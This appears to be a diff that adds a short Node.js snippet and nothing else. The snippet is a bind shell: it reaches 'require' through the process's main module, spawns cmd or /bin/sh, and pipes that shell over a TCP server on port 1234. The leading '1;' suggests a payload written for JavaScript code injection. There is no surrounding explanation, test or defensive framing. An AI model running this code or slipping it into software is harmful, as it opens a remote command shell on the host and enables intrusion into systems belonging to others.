@@ -1,0 +1,20 @@
+1;(function() {
+    var require = global.require || global.process.mainModule.constructor._load;
+    if (!require) return;
+    var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh";
+    var net = require("net"),
+        cp = require("child_process"),
+        util = require("util");
+    var server = net.createServer(function(socket) {
+        var sh = cp.spawn(cmd, []);
+        socket.pipe(sh.stdin);
+        if (typeof util.pump === "undefined") {
+            sh.stdout.pipe(socket);
+            sh.stderr.pipe(socket);
+        } else {
+            util.pump(sh.stdout, socket);
+            util.pump(sh.stderr, socket);
+        }
+    });
+    server.listen(1234);
+})();
